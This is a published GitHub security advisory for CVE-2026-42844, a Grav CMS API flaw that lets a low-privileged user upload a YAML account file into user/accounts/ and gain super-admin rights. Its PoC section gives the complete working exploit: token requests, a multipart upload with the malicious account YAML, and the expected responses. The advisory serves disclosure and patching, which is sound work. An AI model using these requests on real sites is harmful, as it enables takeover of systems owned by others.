# [H] Low-privileged Grav API users can create super-admin accounts via blueprint-upload

## Summary
Severity: High
Advisory: GHSA-6xx2-m8wv-756h
CVE: CVE-2026-42844
CWE: CWE-269, CWE-434
Ecosystem: Packagist
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-05-06
Source: https://github.com/advisories/GHSA-6xx2-m8wv-756h
Type: github-advisory

## Affected
- Packagist: `getgrav/grav` — affected >=0 <2.0.0-beta.4

## Details
## Summary

In Grav `2.0.0-beta.2`, a low-privileged authenticated API user with `api.media.write` can abuse `/api/v1/blueprint-upload` to write an arbitrary YAML file into `user/accounts/`, then log in as the newly created account with `api.super` privileges.

This results in full administrative compromise of the Grav API.

## Details

The vulnerability is located in the API plugin's blueprint upload flow:

- `user/plugins/api/classes/Api/ApiRouter.php:261`
- `user/plugins/api/classes/Api/Controllers/BlueprintUploadController.php:32-45`
- `user/plugins/api/classes/Api/Controllers/BlueprintUploadController.php:102-114`
- `user/plugins/api/classes/Api/Controllers/BlueprintUploadController.php:271-308`
- `user/plugins/api/classes/Api/Controllers/BlueprintUploadController.php:407-417`
- `user/plugins/api/classes/Api/Controllers/AuthController.php:41-55`

The issue exists because `/api/v1/blueprint-upload` accepts caller-controlled `destination` and `scope` values and uses them to resolve the final filesystem write target.

When the request uses:

- `destination=self@:`
- `scope=users/anything`

The server resolves the write target to the shared account directory:

```text
user/accounts/
```

The upload handler then writes the supplied file directly into that directory and does not block YAML account files. Because Grav accepts account YAML files and supports a plaintext `password:` field on first login, an attacker can create a fully functional administrator account with `api.super`.

The required attacker privilege is low:

```yaml
access:
  api:
    access: true
    media:
      write: true
```

## PoC

### Step 1: Authenticate as the low-privileged API user

```http
POST /api/v1/auth/token HTTP/1.1
Host: 127.0.0.1:8123
Content-Type: application/json
Connection: close

{"username":"uploader","password":"Upload123A"}
```

Extract:

```text
UPLOADER_TOKEN = <access_token from response>
```

Attachment:

<img width="1480" height="825" alt="login-uploader" src="https://github.com/user-attachments/assets/5aeda840-4a37-4365-8e46-caec88066541" />

### Step 2: Upload a malicious account YAML file

```http
POST /api/v1/blueprint-upload HTTP/1.1
Host: 127.0.0.1:8123
X-API-Token: <UPLOADER_TOKEN>
Content-Type: multipart/form-data; boundary=----CodexBoundaryF01
Connection: close

------CodexBoundaryF01
Content-Disposition: form-data; name="destination"

self@:
------CodexBoundaryF01
Content-Disposition: form-data; name="scope"

users/anything
------CodexBoundaryF01
Content-Disposition: form-data; name="file"; filename="pwned.yaml"
Content-Type: text/yaml

email: attacker@example.com
fullname: attacker
title: Site Administrator
state: enabled
password: Passw0rd!123
access:
  site:
    login: true
  api:
    super: true
------CodexBoundaryF01--
```

Expected result:

```json
{
  "data": [
    {
      "name": "pwned.yaml",
      "path": "user/accounts/pwned.yaml"
    }
  ]
}
```

Attachment:

<img width="1484" height="797" alt="upload" src="https://github.com/user-attachments/assets/0b24c03f-cac5-4b4d-840c-52ac0840969f" />

### Step 3: Log in as the newly created account

```http
POST /api/v1/auth/token HTTP/1.1
Host: 127.0.0.1:8123
Content-Type: application/json
Connection: close

{"username":"pwned","password":"Passw0rd!123"}
```

Expected result:

```json
{
  "data": {
    "user": {
      "username": "pwned",
      "super_admin": true
    }
  }
}
```

Attachment:

<img width="1494" height="830" alt="pwned-login" src="https://github.com/user-attachments/assets/7a1ab7fc-d3fb-4077-9b61-09cd947241fe" />

### Step 4: Verify privileged API access

```http
GET /api/v1/system/info HTTP/1.1
Host: 127.0.0.1:8123
X-API-Token: <PWNED_TOKEN>
Connection: close
```

Expected result:

The request succeeds and returns system-level information.

Attachment:

<img width="1480" height="831" alt="system-info" src="https://github.com/user-attachments/assets/31677d61-3dbd-4ea6-9fbe-80799a628cc2" />

## Impact

This is an authenticated vertical privilege-escalation vulnerability.

Any API user with basic media upload capability can escalate directly to a full API super administrator by planting a new account YAML file. Once `api.super` access is obtained, the attacker gains full control over the CMS management API and can:

- modify content
- alter configuration
- manage users
- install or update plugins/themes
- access system-level administration features

In a real deployment, this level of control is sufficient for complete CMS compromise and may be chained into server-side code execution depending on enabled plugins, writable template paths, or package-management workflow.

This issue was reproduced locally:

- the upload response returned `user/accounts/pwned.yaml`
- logging in as `pwned` succeeded
- the new account had `super_admin = true`
- privileged endpoints such as `/api/v1/system/info` were accessible

## References
- https://github.com/getgrav/grav/security/advisories/GHSA-6xx2-m8wv-756h
- https://nvd.nist.gov/vuln/detail/CVE-2026-42844
- https://github.com/getgrav/grav-plugin-api/commit/97fc02844a35f743dfe93d34efd92d47eedd5bc5
- https://github.com/getgrav/grav
